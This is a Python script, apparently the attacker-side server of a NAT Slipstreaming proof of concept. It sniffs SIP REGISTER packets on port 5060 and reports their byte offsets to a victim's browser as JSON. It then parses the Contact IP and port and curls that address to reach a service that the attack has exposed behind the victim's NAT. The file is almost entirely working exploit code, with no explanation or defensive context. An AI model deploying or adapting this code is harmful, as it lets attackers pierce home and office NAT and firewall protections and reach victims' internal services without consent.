#!/usr/bin/env python3

import re
import socket
import ipaddress
import subprocess
from scapy.all import *
import threading

HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 5060        # Port to listen on (non-privileged ports are > 1023)

JSON_OK="""HTTP/1.0 200 OK\r
Server: SimpleHTTP/0.6 Python/3.8.5\r
Date: Tue, 02 Mar 2021 04:13:06 GMT\r
Connection: close\r
Content-Type: application/json;charset=utf-8\r
Access-Control-Allow-Origin: *\r
Content-Length: $CL\r
\r
"""

JSON_BODY="""{"offset": $OFFSET, "body": "$BODY"}\r
"""

NOT_FOUND=b"""HTTP/1.0 404 File not found\r
Server: SimpleHTTP/0.6 Python/3.8.5\r
Date: Tue, 02 Mar 2021 04:13:06 GMT\r
Connection: close\r
Content-Type: text/html;charset=utf-8\r
Content-Length: 469\r

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"\r
        "http://www.w3.org/TR/html4/strict.dtd">\r
<html>\r
    <head>\r
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">\r
        <title>Error response</title>\r
    </head>\r
    <body>\r
        <h1>Error response</h1>\r
        <p>Error code: 404</p>\r
        <p>Message: File not found.</p>\r
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>\r
    </body>\r
</html>\r
"""

offsets={}
condition = threading.Condition()

## Define our Custom Action function
def log_offsets(packet):
    try:
        if packet[TCP] and 'REGISTER' in str(packet[TCP].payload):
            with condition:
                offsets[packet[0][1].src] = str(packet[TCP].payload).index('REGISTER', 0)-2
                condition.notify()
    except:
        pass
    return ""

## Setup sniff, filtering for IP traffic
t = AsyncSniffer(filter="port 5060", prn=log_offsets)
t.start()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    while True:
        print("running ...")
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            while True:
                print("Waiting for more data ...")
                data = b''
                #while b'REGISTER' not in data:
                while b'\r\n\r\n' not in data:
                    data = conn.recv(4096)
                    print("<<<<<<", data)
                    if not data:
                        break
                if b'REGISTER' not in data:
                    print("REGISTER not found")
                    conn.sendall(NOT_FOUND)
                    break
                print("waiting on CV")
                with condition:
                    condition.wait(timeout=3.0)
                if offsets[addr[0]] != 0:
                    body = JSON_BODY.replace("$OFFSET", str(offsets[addr[0]])).replace("$BODY","")
                    head = JSON_OK.replace("$CL", str(len(body)))
                    conn.sendall((head+body).encode('utf-8'))
                    break
                search = re.search(b'Contact: <sip:.*?@([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+)', data, re.IGNORECASE)
                if search:
                    ip = search.group(1).decode('utf-8')
                    port = int(search.group(2).decode('utf-8'))
                    print("ip port:",ip,port)

                    if not ipaddress.ip_address(ip).is_private:
                        try:
                            output = subprocess.check_output("curl -i --connect-timeout 1 -X GET http://{}:{}/".format(ip,port), shell=True)
                            print("############################################\n",output.decode('utf-8'),"############################################\n")
                            body = JSON_BODY.replace("$OFFSET", "0").replace("$BODY", output.decode('utf-8'))
                            head = JSON_OK.replace("$CL", str(len(body)))
                            conn.sendall((head+body).encode('utf-8'))
                        except subprocess.CalledProcessError:
                            print("curl failed!")
                            conn.sendall(NOT_FOUND)
                    else:
                        print("found ip is private")
                        conn.sendall(NOT_FOUND)
                else:
                    print("search is None")
                    conn.sendall(NOT_FOUND)
                break